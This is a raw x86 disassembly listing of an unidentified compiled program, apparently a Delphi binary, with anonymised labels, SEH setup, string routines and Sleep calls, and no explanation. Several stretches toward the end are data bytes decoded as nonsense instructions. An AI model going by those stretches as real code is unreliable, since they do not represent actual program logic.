lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a7d3f0
mov eax [ rw-data ]
call sub_3af35c0
mov eax [ ebx + 0x398 ]
call sub_3ae4d34
mov eax [ ebx + 0x398 ]
mov dl 0x1
call sub_3ae4b38
xor eax eax
push ebp
push sub_3af4f0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea edx [ ebp - 0x94 ]
xor eax eax
call sub_3a63350
mov eax [ ebp - 0x94 ]
lea edx [ ebp - 0x90 ]
call sub_3a69fb0
mov edx [ ebp - 0x90 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0x98 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0x98 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0x9c ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x9c ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push sub_3af4ff2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xa8 ]
call sub_3af1f0c
mov edx [ ebp - 0xa8 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xac ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xac ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xb0 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xb0 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xbc ]
call sub_3af1f74
mov edx [ ebp - 0xbc ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xc0 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xc4 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xd0 ]
call sub_3af1f74
mov edx [ ebp - 0xd0 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xd4 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xd4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xd8 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xd8 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push sub_3af52a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xe4 ]
call sub_3af20c8
mov edx [ ebp - 0xe4 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xe8 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xe8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xec ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xec ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xf8 ]
call sub_3af1ea4
mov edx [ ebp - 0xf8 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xfc ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xfc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0x100 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x100 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle sub_3af5608
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xc
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_3af2538
push r-xdata
lea edx [ ebp - 0xa4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xa4 ]
push r-xdata
lea eax [ ebp - 0xa0 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xa0 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xb8 ]
push r-xdata
lea eax [ ebp - 0xb4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xb4 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xcc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xcc ]
push r-xdata
lea eax [ ebp - 0xc8 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xc8 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xe0 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xe0 ]
push r-xdata
lea eax [ ebp - 0xdc ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xdc ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xf4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xf4 ]
push r-xdata
lea eax [ ebp - 0xf0 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xf0 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0x108 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x108 ]
push r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x104 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xd
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax rw-data
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov eax [ ebx + 0x39c ]
call sub_3ae4d34
mov eax [ ebx + 0x39c ]
mov dl 0x1
call sub_3ae4b38
sub_3af5396
call sub_3a64cb0
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x8
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
push r-xdata
lea ecx [ ebp - 0x110 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_3af3378
push [ ebp - 0x110 ]
push r-xdata
lea eax [ ebp - 0x10c ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x10c ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xf
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a7d3f0
mov eax [ rw-data ]
call sub_3af35c0
mov eax [ ebx + 0x398 ]
call sub_3ae4d34
mov eax [ ebx + 0x398 ]
mov dl 0x1
call sub_3ae4b38
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle sub_3af5608
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xc
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_3af2538
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xd
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax rw-data
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov eax [ ebx + 0x39c ]
call sub_3ae4d34
mov eax [ ebx + 0x39c ]
mov dl 0x1
call sub_3ae4b38
sub_3af5608
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af565c
lea eax [ ebp - 0x110 ]
mov edx 0x32
call sub_3a652c4
lea eax [ ebp - 0x44 ]
mov edx 0x4
call sub_3a652c4
lea eax [ ebp - 0x34 ]
call sub_3a652a0
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_3a652c4
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_3a652c4
retn
sub_3af5a84
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx ecx
xor eax eax
push ebp
push sub_3af5ac9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ae3aec
mov eax [ ebp - 0x4 ]
call sub_3a65730
xor edx edx
call sub_3af0d30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af5ad0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af5ad4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx ecx
xor eax eax
push ebp
push sub_3af5b31
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7d0
call Sleep
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af5b38
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af5b78
push ebx
mov ebx eax
xor edx edx
mov eax [ ebx + 0x378 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x36c ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x374 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x380 ]
mov eax [ eax + 0x250 ]
mov edx 0x1
call sub_3ad8570
mov edx r-xdata
call sub_3ad84cc
pop ebx
retn
sub_3af5bea
add [ eax ] al
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x37c ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x384 ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x388 ]
call sub_3ae4b38
pop ebx
retn
mov [ rw-data ] 0x0
pop ebx
retn
sub_3af5c3c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx ecx
xor eax eax
push ebp
push sub_3af5c99
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7d0
call Sleep
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af5ca0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af5de3
dec [ edx ]
add [ eax ] al
add [ esp + edi * 2 ] bh
push ebp
push eax
dec esp
dec edi
inc ecx
inc esp
jl r-xdata
sar al cl
dec [ ebx + 0x407389d8 ]
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3ae35c4
mov eax ebx
call sub_3a83590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af5e83
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
add [ eax ] al
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x8
sub_3af5e04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
xor eax eax
push ebp
push sub_3af5e7c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7d0
call Sleep
mov cl 0x1
mov dl 0x1
mov eax [ sub_3af37b8 ]
call sub_3a830d4
mov ebx eax
mov [ ebx + 0x40 ] esi
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3ae35c4
mov eax ebx
call sub_3a83590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af5e83
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af5ebc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_3a64b54#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af6087
lea eax [ ebp - 0x18 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebx + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
push 0xa
call Sleep
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x40 ]
call sub_3ae3aec
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call j_sub_3a65744#2
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0x8 ]
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov edx eax
add edx 0x8
mov eax [ ebp - 0x4 ]
pop ecx
call sub_3a65798
mov eax [ ebp - 0x18 ]
call sub_3a699d8
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebp - 0x9 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push 0x0
mov eax esi
call sub_3a7cbbc
mov [ ebp - 0x9 ] 0x0
mov edx [ rw-data ]
mov eax esi
call sub_3a7d31c
mov eax esi
call sub_3a64380
mov eax [ rw-data ]
mov eax [ eax + 0x37c ]
mov eax [ eax + 0x90 ]
mov edx r-xdata
call sub_3ae35c4
mov eax [ ebx + 0x40 ]
call sub_3ae2d80
sub_3af6043
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af6087
lea eax [ ebp - 0x18 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebx + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
push 0xa
call Sleep
cmp [ ebx + 0xd ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x40 ]
call sub_3ae3aec
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call j_sub_3a65744#2
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0x8 ]
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov edx eax
add edx 0x8
mov eax [ ebp - 0x4 ]
pop ecx
call sub_3a65798
mov eax [ ebp - 0x18 ]
call sub_3a699d8
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebp - 0x9 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push 0x0
mov eax esi
call sub_3a7cbbc
mov [ ebp - 0x9 ] 0x0
mov edx [ rw-data ]
mov eax esi
call sub_3a7d31c
mov eax esi
call sub_3a64380
mov eax [ rw-data ]
mov eax [ eax + 0x37c ]
mov eax [ eax + 0x90 ]
mov edx r-xdata
call sub_3ae35c4
mov eax [ ebx + 0x40 ]
call sub_3ae2d80
sub_3af60d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3af615b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3af20c8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x4 ]
call sub_3a69da8
test al al
jne r-xdata
xor edx edx
mov eax [ ebx + 0x3a0 ]
call sub_3a9c298
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af6162
lea eax [ ebp - 0x8 ]
call sub_3af20c8
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_3af1fdc
sub_3af619b
dec [ ecx ]
add [ eax ] al
add [ ebx + 0x6b ] ah
push 0x66
push 0x64
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
mov ebx ecx
xor eax eax
push ebp
push sub_3af6209
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7d0
call Sleep
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af6210
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af6248
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx ecx
xor eax eax
push ebp
push sub_3af62db
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ae3aec
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af62e2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_3a7cbbc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
lea eax [ ebp - 0x8 ]
call sub_3a69958
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_3a6556c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_3ae35c4
mov edx [ rw-data ]
mov eax ebx
call sub_3ae37ac
sub_3af62fb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_3a648a0#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3af6344
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3af6389
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af6390
retn
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
sub_3af6548
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
imul ebp [ edi - 0x50996bfd ] 0xaf67d103
add eax [ eax ]
add [ eax ] al
add [ esi ] cl
imul ebp [ edi + 0x3b403 ] 0xac2a1400
add esi eax
cmp eax 0x5d5403a8
lodsb [ esi ]
add ebx [ eax + 0x5f ]
lodsb [ esi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x6b ]
lodsb [ esi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
add ebx [ eax + 0x63 ]
lodsb [ esi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
xor [ edi - 0x54 ] ch
add esp esp
cmp ch [ eax - 0x5340fffd ]
add ecx eax
pop ebx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x1c03ac61 ]
bound ebp [ ebx + eax + sub_3ac6358 ]
jo r-xdata
inc ebx
sub_3af6818
scasd [ edi ]
add ecx [ ecx ]
push ebx
push ebx
xor [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
insb
outsb
adc [ eax ] al
jo r-xdata
imul esp [ ebx + 0x6b ] 0x9314000f
outsb
arpl [ ecx + 0x61 ] bp
outsd
jb r-xdata
xor [ ebx + eax + 0x60000 ] ebp
adc [ edx + 0x61 ] eax
imul edi [ eax + 0x61 ] 0x78456572
arpl [ gs : ebp + 0x6c ] si
je r-xdata
scasd [ edi ]
add ecx [ ecx ]
push ebx
push ebx
xor [ ecx + 0x63 ] eax
inc ebp
inc [ eax ]
test ebx ebx
je r-xdata
push ebx
push 0x5406776f
scasd [ edi ]
add ecx [ eax ]
inc esi
outsd
jb r-xdata
inc ecx
jb r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
jb r-xdata
add al bh
xchg ecx eax
scasd [ edi ]
add ecx [ ebx ]
